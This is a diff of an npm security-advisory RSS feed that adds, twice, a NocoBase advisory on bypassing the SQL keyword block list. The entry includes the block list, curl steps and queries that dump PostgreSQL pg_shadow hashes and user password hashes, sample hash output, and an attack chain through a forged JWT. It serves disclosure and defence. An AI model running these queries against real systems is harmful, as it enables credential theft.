@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-28T19:04:42.371Z</updated>
+    <updated>2026-07-28T20:57:06.372Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,954 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@nocobase/plugin-collection-sql] NocoBase: Sensitive Data Exposure via SQL Blacklist Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</id>
+        <link href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q"/>
+        <updated>2026-07-28T20:53:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="security-vulnerability-report-sensitive-data-exposure-via-sql-blacklist-bypass">Security Vulnerability Report: Sensitive Data Exposure via SQL Blacklist Bypass</h1>
+<h2 id="summary">Summary</h2>
+<p>The <code>checkSQL()</code> function in <code>plugin-collection-sql</code> implements a <strong>keyword-based blacklist</strong> to prevent dangerous SQL queries from being executed through the SQL Collection feature. However, the blacklist is <strong>incomplete</strong>: it only checks for a subset of dangerous PostgreSQL system functions and <strong>does not restrict access to sensitive system catalog tables</strong> such as <code>pg_shadow</code>, <code>pg_roles</code>, or <code>pg_stat_activity</code>.</p>
+<p>An authenticated user with the <code>admin</code> role can exploit this to <strong>dump PostgreSQL password hashes</strong> (<code>pg_shadow</code>), <strong>read all NocoBase user credentials</strong> (hashed passwords from the <code>users</code> table), and <strong>enumerate the full database schema</strong> — all data that admin users should never be able to access through the application interface.</p>
+<hr>
+<h2 id="affected-component">Affected Component</h2>
+<p><strong>File</strong>: <code>packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts</code></p>
+<pre><code class="language-typescript">export const checkSQL = (sql: string) =&gt; {
+  const dangerKeywords = [
+    // PostgreSQL — BLOCKED
+    'pg_read_file',
+    'pg_read_binary_file',
+    'pg_stat_file',
+    'pg_ls_dir',
+    'pg_logdir_ls',
+    'pg_terminate_backend',
+    'pg_cancel_backend',
+    'current_setting',
+    'set_config',
+    'pg_reload_conf',
+    'pg_sleep',
+    'generate_series',
+
+    // MySQL — BLOCKED
+    'LOAD_FILE',
+    'BENCHMARK',
+    '@@global.',
+    '@@session.',
+
+    // SQLite — BLOCKED
+    'sqlite3_load_extension',
+    'load_extension',
+  ];
+
+  // NOT BLOCKED: pg_shadow, pg_roles, pg_stat_activity,
+  //                 information_schema, users table direct access, etc.
+
+  sql = sql.trim().split(';').shift();
+  if (!/^select/i.test(sql) &amp;&amp; !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
+    throw new Error('Only supports SELECT statements or WITH clauses');
+  }
+  if (dangerKeywords.some((keyword) =&gt; sql.toLowerCase().includes(keyword.toLowerCase()))) {
+    throw new Error('SQL statements contain dangerous keywords');
+  }
+};
+</code></pre>
+<p>The <code>execute</code> action in <code>sql.ts</code> passes user-supplied SQL directly through this insufficient check:</p>
+<pre><code class="language-typescript">// sql.ts — execute action
+execute: async (ctx: Context, next: Next) =&gt; {
+  const { sql } = ctx.action.params.values || {};
+  try {
+    checkSQL(sql);         // ← insufficient validation
+  } catch (e) {
+    ctx.throw(400, ctx.t(e.message));
+  }
+  // SQL is executed directly against the database
+  const data = await model.findAll({ attributes: ['*'], limit: 5, raw: true });
+  ctx.body = { data, fields, sources };
+}
+</code></pre>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<p>The blacklist approach is <strong>fundamentally incomplete</strong>. It attempts to enumerate every dangerous construct but misses entire categories:</p>
+<ol>
+<li><strong>PostgreSQL system catalog tables</strong> — <code>pg_shadow</code>, <code>pg_authid</code>, <code>pg_roles</code>, <code>pg_stat_activity</code> are not restricted</li>
+<li><strong>Application-level sensitive tables</strong> — <code>users</code> (containing hashed passwords) can be queried directly</li>
+<li><strong><code>information_schema</code></strong> — full schema enumeration is possible</li>
+<li><strong>Schema-qualified variants</strong> — even some blocked functions could be bypassed via <code>pg_catalog.</code> prefix (e.g. <code>pg_catalog.pg_read_file</code> may bypass checks in older versions)</li>
+</ol>
+<p>The correct approach is an <strong>allowlist</strong> (whitelist) of permitted tables/schemas, not a blacklist of forbidden keywords.</p>
+<hr>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p><strong>Prerequisites</strong>: A user account with the <code>admin</code> role (has the <code>pm.data-source-manager.collection-sql</code> ACL snippet).</p>
+<p><strong>Step 1</strong>: Authenticate and obtain a token:</p>
+<pre><code class="language-bash">TOKEN=$(curl -s -X POST http://&lt;TARGET&gt;/api/auth:signIn \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@example.com","password":"&lt;password&gt;"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
+</code></pre>
+<p><strong>Step 2</strong>: Dump PostgreSQL password hashes from <code>pg_shadow</code>:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT usename, passwd FROM pg_shadow LIMIT 10"}'
+</code></pre>
+<p><strong>Response</strong>:</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "usename": "nocobase",
+        "passwd": "SCRAM-SHA-256$4096:wmmGvfjPHRDsnzjOfHCmUQ==$fAXKBU7y3Ymmgg0iq6ibc66fN+v3Q7FaX86RgxP0tTY=:enn2dRiXhUQ2N5o4bRtZLNB3B8FpAdKC8Cp3HZ/hSFU="
+      }
+    ]
+  }
+}
+</code></pre>
+<p><strong>Step 3</strong>: Dump NocoBase user credentials:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT id, email, username, password FROM users LIMIT 100"}'
+</code></pre>
+<p><strong>Response</strong> (verified):</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "id": 1,
+        "email": "admin@nocobase.com",
+        "username": "nocobase",
+        "password": "1afc4721f320c4e097ac4aaca33544e7dadcc8cd7d57d40240f987bdbcbc686b"
+      }
+    ]
+  }
+}
+</code></pre>
+<hr>
+<h2 id="additional-verified-bypass-queries">Additional Verified Bypass Queries</h2>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Blocked?</th>
+<th>Data Exposed</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT usename, passwd FROM pg_shadow</code></td>
+<td><strong>Not blocked</strong></td>
+<td>PostgreSQL DB user password hashes</td>
+</tr>
+<tr>
+<td><code>SELECT id, email, password FROM users</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All NocoBase user credential hashes</td>
+</tr>
+<tr>
+<td><code>SELECT table_name FROM information_schema.tables</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Full database schema enumeration</td>
+</tr>
+<tr>
+<td><code>SELECT rolname, rolsuper FROM pg_roles</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All DB roles and superuser flags</td>
+</tr>
+<tr>
+<td><code>SELECT pid, query FROM pg_stat_activity</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Live SQL queries from all sessions</td>
+</tr>
+<tr>
+<td><code>SELECT pg_read_file('/etc/passwd')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>SELECT current_setting('app.key')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="why-admin-required-still-matters">Why Admin-Required Still Matters</h2>
+<p>This vulnerability is rated <strong>High</strong> despite requiring admin-level authentication. The reasoning:</p>
+<h3 id="1-security-boundary-violation-scope-changed-→-sc">1. Security Boundary Violation (Scope Changed → S:C)</h3>
+<p>The <code>admin</code> role in NocoBase is an <strong>application-level</strong> role — it manages workflows, collections, and UI. It is <strong>not</strong> a database administrator. Accessing <code>pg_shadow</code> is a <strong>PostgreSQL system-level</strong> privilege that admins should never have. The <code>checkSQL()</code> function was explicitly created to enforce this boundary; bypassing it breaks the intended security model.</p>
+<h3 id="2-data-that-admin-cannot-access-through-normal-ui">2. Data That Admin Cannot Access Through Normal UI</h3>
+<p>Even with admin privileges, NocoBase's UI and API <strong>do not expose</strong>:</p>
+<ul>
+<li><code>pg_shadow</code> (PostgreSQL internal password store)</li>
+<li>Raw <code>users.password</code> hashes via standard API responses</li>
+<li>Full <code>information_schema</code> enumeration</li>
+</ul>
+<p>VUL-2 grants access to all of the above — data the application explicitly chose not to expose.</p>
+<h3 id="3-enables-lateral-movement">3. Enables Lateral Movement</h3>
+<p>The <code>pg_shadow</code> SCRAM-SHA-256 hashes can be subjected to offline dictionary attacks. If cracked, the attacker gains <strong>direct PostgreSQL access</strong> with the application's DB credentials — bypassing the NocoBase application layer entirely. This enables reading <strong>all data</strong> in the database (not just what NocoBase exposes), modifying records directly, and accessing data from other schemas.</p>
+<h3 id="4-enables-full-attack-chain-when-combined-with-other-vulnerabilities">4. Enables Full Attack Chain When Combined with Other Vulnerabilities</h3>
+<pre><code>Member user (lowest privilege)
+  → VUL-8: Trigger a pre-built RCE workflow (any logged-in user can trigger)
+  → VUL-1: RCE reads APP_KEY from process.env
+  → Forge JWT with admin role
+  → VUL-2: Dump pg_shadow + users.password
+  → Crack hashes → full PostgreSQL access
+</code></pre>
+<hr>
+<h2 id="impacted-api-endpoint">Impacted API Endpoint</h2>
+<pre><code>POST /api/sqlCollection:execute
+</code></pre>
+<ul>
+<li><strong>Authentication</strong>: Required (<code>admin</code> role)</li>
+<li><strong>ACL Snippet</strong> registered in <code>plugin.ts</code>:<pre><code class="language-typescript">this.app.acl.registerSnippet({
+  name: `pm.data-source-manager.collection-sql`,
+  actions: ['sqlCollection:*'],   // includes :execute
+});
+</code></pre>
+</li>
+<li>The <code>admin</code> role includes this snippet by default.</li>
+</ul>
+<hr>
+<h2 id="recommended-fixes">Recommended Fixes</h2>
+<h3 id="fix-1-immediate-extend-the-blacklist-with-system-catalog-tables">Fix 1 (Immediate): Extend the blacklist with system catalog tables</h3>
+<pre><code class="language-typescript">const dangerKeywords = [
+  // ... existing entries ...
+
+  // ADD: PostgreSQL system catalog tables with sensitive data
+  'pg_shadow',
+  'pg_authid',
+  'pg_auth_members',
+  'pg_stat_activity',
+  'pg_roles',
+  // Note: information_schema should also be restricted for non-DBA roles
+];
+</code></pre>
+<h3 id="fix-2-recommended-replace-blacklist-with-schema-allowlist">Fix 2 (Recommended): Replace blacklist with schema allowlist</h3>
+<p>Instead of blocking dangerous keywords, only allow queries against <strong>user-defined collection tables</strong>:</p>
+<pre><code class="language-typescript">// Allowlist approach: extract table names from AST and verify against known collections
+const allowedTables = await db.getCollectionNames(); // tables created by NocoBase users
+const referencedTables = extractTableNames(parsedSQL);
+if (!referencedTables.every(t =&gt; allowedTables.includes(t))) {
+  throw new Error('Query references tables outside the allowed scope');
+}
+</code></pre>
+<h3 id="fix-3-defense-in-depth-use-a-read-only-restricted-db-user">Fix 3 (Defense-in-depth): Use a read-only, restricted DB user</h3>
+<p>The application's DB connection should use a PostgreSQL user that:</p>
+<ul>
+<li>Does <strong>not</strong> have <code>SELECT</code> privilege on <code>pg_shadow</code> or <code>pg_authid</code></li>
+<li>Only has access to the application's own schema (<code>nocobase</code> schema)</li>
+</ul>
+<p>This ensures that even if the blacklist is bypassed, the DB user cannot access system catalogs.</p>
+<hr>
+<h2 id="environment">Environment</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NocoBase version</td>
+<td>2.0.59-full</td>
+</tr>
+<tr>
+<td>Database</td>
+<td>PostgreSQL 16.14</td>
+</tr>
+<tr>
+<td>Deployment</td>
+<td>Docker (<code>nocobase/nocobase:2.0.59-full</code>)</td>
+</tr>
+<tr>
+<td>Vulnerable file</td>
+<td><code>plugin-collection-sql/src/server/utils.ts</code> — <code>checkSQL()</code></td>
+</tr>
+<tr>
+<td>Vulnerable endpoint</td>
+<td><code>POST /api/sqlCollection:execute</code></td>
+</tr>
+<tr>
+<td>Auth required</td>
+<td>Admin role (<code>pm.data-source-manager.collection-sql</code> snippet)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-05-29</td>
+<td>Vulnerability discovered via whitebox source code audit of <code>utils.ts</code></td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Exploit verified on live Docker instance — <code>pg_shadow</code> and <code>users.password</code> dumped</td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Report submitted to maintainers</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="script-and-video-poc">Script and video PoC:</h2>
+<p><a href="https://github.com/user-attachments/files/28380402/poc_vul2_sqli.py">poc_vul2_sqli.py</a></p>
+<p><a href="https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732">https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52888">https://nvd.nist.gov/vuln/detail/CVE-2026-52888</a></li>
+<li><a href="https://github.com/nocobase/nocobase/pull/9683">https://github.com/nocobase/nocobase/pull/9683</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45">https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4">https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.0.62">https://github.com/nocobase/nocobase/releases/tag/v2.0.62</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46">https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46</a></li>
+<li><a href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-28T20:53:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nocobase/plugin-collection-sql] NocoBase: Sensitive Data Exposure via SQL Blacklist Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</id>
+        <link href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q"/>
+        <updated>2026-07-28T20:53:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="security-vulnerability-report-sensitive-data-exposure-via-sql-blacklist-bypass">Security Vulnerability Report: Sensitive Data Exposure via SQL Blacklist Bypass</h1>
+<h2 id="summary">Summary</h2>
+<p>The <code>checkSQL()</code> function in <code>plugin-collection-sql</code> implements a <strong>keyword-based blacklist</strong> to prevent dangerous SQL queries from being executed through the SQL Collection feature. However, the blacklist is <strong>incomplete</strong>: it only checks for a subset of dangerous PostgreSQL system functions and <strong>does not restrict access to sensitive system catalog tables</strong> such as <code>pg_shadow</code>, <code>pg_roles</code>, or <code>pg_stat_activity</code>.</p>
+<p>An authenticated user with the <code>admin</code> role can exploit this to <strong>dump PostgreSQL password hashes</strong> (<code>pg_shadow</code>), <strong>read all NocoBase user credentials</strong> (hashed passwords from the <code>users</code> table), and <strong>enumerate the full database schema</strong> — all data that admin users should never be able to access through the application interface.</p>
+<hr>
+<h2 id="affected-component">Affected Component</h2>
+<p><strong>File</strong>: <code>packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts</code></p>
+<pre><code class="language-typescript">export const checkSQL = (sql: string) =&gt; {
+  const dangerKeywords = [
+    // PostgreSQL — BLOCKED
+    'pg_read_file',
+    'pg_read_binary_file',
+    'pg_stat_file',
+    'pg_ls_dir',
+    'pg_logdir_ls',
+    'pg_terminate_backend',
+    'pg_cancel_backend',
+    'current_setting',
+    'set_config',
+    'pg_reload_conf',
+    'pg_sleep',
+    'generate_series',
+
+    // MySQL — BLOCKED
+    'LOAD_FILE',
+    'BENCHMARK',
+    '@@global.',
+    '@@session.',
+
+    // SQLite — BLOCKED
+    'sqlite3_load_extension',
+    'load_extension',
+  ];
+
+  // NOT BLOCKED: pg_shadow, pg_roles, pg_stat_activity,
+  //                 information_schema, users table direct access, etc.
+
+  sql = sql.trim().split(';').shift();
+  if (!/^select/i.test(sql) &amp;&amp; !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
+    throw new Error('Only supports SELECT statements or WITH clauses');
+  }
+  if (dangerKeywords.some((keyword) =&gt; sql.toLowerCase().includes(keyword.toLowerCase()))) {
+    throw new Error('SQL statements contain dangerous keywords');
+  }
+};
+</code></pre>
+<p>The <code>execute</code> action in <code>sql.ts</code> passes user-supplied SQL directly through this insufficient check:</p>
+<pre><code class="language-typescript">// sql.ts — execute action
+execute: async (ctx: Context, next: Next) =&gt; {
+  const { sql } = ctx.action.params.values || {};
+  try {
+    checkSQL(sql);         // ← insufficient validation
+  } catch (e) {
+    ctx.throw(400, ctx.t(e.message));
+  }
+  // SQL is executed directly against the database
+  const data = await model.findAll({ attributes: ['*'], limit: 5, raw: true });
+  ctx.body = { data, fields, sources };
+}
+</code></pre>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<p>The blacklist approach is <strong>fundamentally incomplete</strong>. It attempts to enumerate every dangerous construct but misses entire categories:</p>
+<ol>
+<li><strong>PostgreSQL system catalog tables</strong> — <code>pg_shadow</code>, <code>pg_authid</code>, <code>pg_roles</code>, <code>pg_stat_activity</code> are not restricted</li>
+<li><strong>Application-level sensitive tables</strong> — <code>users</code> (containing hashed passwords) can be queried directly</li>
+<li><strong><code>information_schema</code></strong> — full schema enumeration is possible</li>
+<li><strong>Schema-qualified variants</strong> — even some blocked functions could be bypassed via <code>pg_catalog.</code> prefix (e.g. <code>pg_catalog.pg_read_file</code> may bypass checks in older versions)</li>
+</ol>
+<p>The correct approach is an <strong>allowlist</strong> (whitelist) of permitted tables/schemas, not a blacklist of forbidden keywords.</p>
+<hr>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p><strong>Prerequisites</strong>: A user account with the <code>admin</code> role (has the <code>pm.data-source-manager.collection-sql</code> ACL snippet).</p>
+<p><strong>Step 1</strong>: Authenticate and obtain a token:</p>
+<pre><code class="language-bash">TOKEN=$(curl -s -X POST http://&lt;TARGET&gt;/api/auth:signIn \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@example.com","password":"&lt;password&gt;"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
+</code></pre>
+<p><strong>Step 2</strong>: Dump PostgreSQL password hashes from <code>pg_shadow</code>:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT usename, passwd FROM pg_shadow LIMIT 10"}'
+</code></pre>
+<p><strong>Response</strong>:</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "usename": "nocobase",
+        "passwd": "SCRAM-SHA-256$4096:wmmGvfjPHRDsnzjOfHCmUQ==$fAXKBU7y3Ymmgg0iq6ibc66fN+v3Q7FaX86RgxP0tTY=:enn2dRiXhUQ2N5o4bRtZLNB3B8FpAdKC8Cp3HZ/hSFU="
+      }
+    ]
+  }
+}
+</code></pre>
+<p><strong>Step 3</strong>: Dump NocoBase user credentials:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT id, email, username, password FROM users LIMIT 100"}'
+</code></pre>
+<p><strong>Response</strong> (verified):</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "id": 1,
+        "email": "admin@nocobase.com",
+        "username": "nocobase",
+        "password": "1afc4721f320c4e097ac4aaca33544e7dadcc8cd7d57d40240f987bdbcbc686b"
+      }
+    ]
+  }
+}
+</code></pre>
+<hr>
+<h2 id="additional-verified-bypass-queries">Additional Verified Bypass Queries</h2>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Blocked?</th>
+<th>Data Exposed</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT usename, passwd FROM pg_shadow</code></td>
+<td><strong>Not blocked</strong></td>
+<td>PostgreSQL DB user password hashes</td>
+</tr>
+<tr>
+<td><code>SELECT id, email, password FROM users</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All NocoBase user credential hashes</td>
+</tr>
+<tr>
+<td><code>SELECT table_name FROM information_schema.tables</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Full database schema enumeration</td>
+</tr>
+<tr>
+<td><code>SELECT rolname, rolsuper FROM pg_roles</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All DB roles and superuser flags</td>
+</tr>
+<tr>
+<td><code>SELECT pid, query FROM pg_stat_activity</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Live SQL queries from all sessions</td>
+</tr>
+<tr>
+<td><code>SELECT pg_read_file('/etc/passwd')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>SELECT current_setting('app.key')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="why-admin-required-still-matters">Why Admin-Required Still Matters</h2>
+<p>This vulnerability is rated <strong>High</strong> despite requiring admin-level authentication. The reasoning:</p>
+<h3 id="1-security-boundary-violation-scope-changed-→-sc">1. Security Boundary Violation (Scope Changed → S:C)</h3>
+<p>The <code>admin</code> role in NocoBase is an <strong>application-level</strong> role — it manages workflows, collections, and UI. It is <strong>not</strong> a database administrator. Accessing <code>pg_shadow</code> is a <strong>PostgreSQL system-level</strong> privilege that admins should never have. The <code>checkSQL()</code> function was explicitly created to enforce this boundary; bypassing it breaks the intended security model.</p>
+<h3 id="2-data-that-admin-cannot-access-through-normal-ui">2. Data That Admin Cannot Access Through Normal UI</h3>
+<p>Even with admin privileges, NocoBase's UI and API <strong>do not expose</strong>:</p>
+<ul>
+<li><code>pg_shadow</code> (PostgreSQL internal password store)</li>
+<li>Raw <code>users.password</code> hashes via standard API responses</li>
+<li>Full <code>information_schema</code> enumeration</li>
+</ul>
+<p>VUL-2 grants access to all of the above — data the application explicitly chose not to expose.</p>
+<h3 id="3-enables-lateral-movement">3. Enables Lateral Movement</h3>
+<p>The <code>pg_shadow</code> SCRAM-SHA-256 hashes can be subjected to offline dictionary attacks. If cracked, the attacker gains <strong>direct PostgreSQL access</strong> with the application's DB credentials — bypassing the NocoBase application layer entirely. This enables reading <strong>all data</strong> in the database (not just what NocoBase exposes), modifying records directly, and accessing data from other schemas.</p>
+<h3 id="4-enables-full-attack-chain-when-combined-with-other-vulnerabilities">4. Enables Full Attack Chain When Combined with Other Vulnerabilities</h3>
+<pre><code>Member user (lowest privilege)
+  → VUL-8: Trigger a pre-built RCE workflow (any logged-in user can trigger)
+  → VUL-1: RCE reads APP_KEY from process.env
+  → Forge JWT with admin role
+  → VUL-2: Dump pg_shadow + users.password
+  → Crack hashes → full PostgreSQL access
+</code></pre>
+<hr>
+<h2 id="impacted-api-endpoint">Impacted API Endpoint</h2>
+<pre><code>POST /api/sqlCollection:execute
+</code></pre>
+<ul>
+<li><strong>Authentication</strong>: Required (<code>admin</code> role)</li>
+<li><strong>ACL Snippet</strong> registered in <code>plugin.ts</code>:<pre><code class="language-typescript">this.app.acl.registerSnippet({
+  name: `pm.data-source-manager.collection-sql`,
+  actions: ['sqlCollection:*'],   // includes :execute
+});
+</code></pre>
+</li>
+<li>The <code>admin</code> role includes this snippet by default.</li>
+</ul>
+<hr>
+<h2 id="recommended-fixes">Recommended Fixes</h2>
+<h3 id="fix-1-immediate-extend-the-blacklist-with-system-catalog-tables">Fix 1 (Immediate): Extend the blacklist with system catalog tables</h3>
+<pre><code class="language-typescript">const dangerKeywords = [
+  // ... existing entries ...
+
+  // ADD: PostgreSQL system catalog tables with sensitive data
+  'pg_shadow',
+  'pg_authid',
+  'pg_auth_members',
+  'pg_stat_activity',
+  'pg_roles',
+  // Note: information_schema should also be restricted for non-DBA roles
+];
+</code></pre>
+<h3 id="fix-2-recommended-replace-blacklist-with-schema-allowlist">Fix 2 (Recommended): Replace blacklist with schema allowlist</h3>
+<p>Instead of blocking dangerous keywords, only allow queries against <strong>user-defined collection tables</strong>:</p>
+<pre><code class="language-typescript">// Allowlist approach: extract table names from AST and verify against known collections
+const allowedTables = await db.getCollectionNames(); // tables created by NocoBase users
+const referencedTables = extractTableNames(parsedSQL);
+if (!referencedTables.every(t =&gt; allowedTables.includes(t))) {
+  throw new Error('Query references tables outside the allowed scope');
+}
+</code></pre>
+<h3 id="fix-3-defense-in-depth-use-a-read-only-restricted-db-user">Fix 3 (Defense-in-depth): Use a read-only, restricted DB user</h3>
+<p>The application's DB connection should use a PostgreSQL user that:</p>
+<ul>
+<li>Does <strong>not</strong> have <code>SELECT</code> privilege on <code>pg_shadow</code> or <code>pg_authid</code></li>
+<li>Only has access to the application's own schema (<code>nocobase</code> schema)</li>
+</ul>
+<p>This ensures that even if the blacklist is bypassed, the DB user cannot access system catalogs.</p>
+<hr>
+<h2 id="environment">Environment</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NocoBase version</td>
+<td>2.0.59-full</td>
+</tr>
+<tr>
+<td>Database</td>
+<td>PostgreSQL 16.14</td>
+</tr>
+<tr>
+<td>Deployment</td>
+<td>Docker (<code>nocobase/nocobase:2.0.59-full</code>)</td>
+</tr>
+<tr>
+<td>Vulnerable file</td>
+<td><code>plugin-collection-sql/src/server/utils.ts</code> — <code>checkSQL()</code></td>
+</tr>
+<tr>
+<td>Vulnerable endpoint</td>
+<td><code>POST /api/sqlCollection:execute</code></td>
+</tr>
+<tr>
+<td>Auth required</td>
+<td>Admin role (<code>pm.data-source-manager.collection-sql</code> snippet)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-05-29</td>
+<td>Vulnerability discovered via whitebox source code audit of <code>utils.ts</code></td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Exploit verified on live Docker instance — <code>pg_shadow</code> and <code>users.password</code> dumped</td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Report submitted to maintainers</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="script-and-video-poc">Script and video PoC:</h2>
+<p><a href="https://github.com/user-attachments/files/28380402/poc_vul2_sqli.py">poc_vul2_sqli.py</a></p>
+<p><a href="https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732">https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52888">https://nvd.nist.gov/vuln/detail/CVE-2026-52888</a></li>
+<li><a href="https://github.com/nocobase/nocobase/pull/9683">https://github.com/nocobase/nocobase/pull/9683</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45">https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4">https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.0.62">https://github.com/nocobase/nocobase/releases/tag/v2.0.62</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46">https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46</a></li>
+<li><a href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-28T20:53:08.000Z</published>
+    </entry>
+    <entry>
